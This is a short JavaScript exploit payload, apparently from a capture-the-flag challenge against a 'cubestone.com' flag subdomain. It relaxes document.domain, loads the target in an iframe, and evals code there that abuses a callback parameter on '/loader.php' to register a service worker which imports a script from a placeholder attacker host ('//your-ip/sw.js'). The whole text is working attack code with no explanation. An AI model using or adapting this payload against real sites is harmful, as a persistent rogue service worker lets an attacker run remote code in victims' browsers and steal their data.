if(!window.__x) {
    document.domain = "cubestone.com";
    var iframe = document.createElement('iframe');
    iframe.src = 'https://flaaaaaaaag.cubestone.com';
    iframe.addEventListener("load", function(){ iffLoadover(); });
    document.body.appendChild(iframe);
    exp = `
    var xhr = new XMLHttpRequest();
    navigator.serviceWorker.register("/loader.php?secret=asdasd&callback=importScripts('//your-ip/sw.js');//")`;
    function iffLoadover(){
        iframe.contentWindow.eval(exp);
    }
    window.__x=1;
}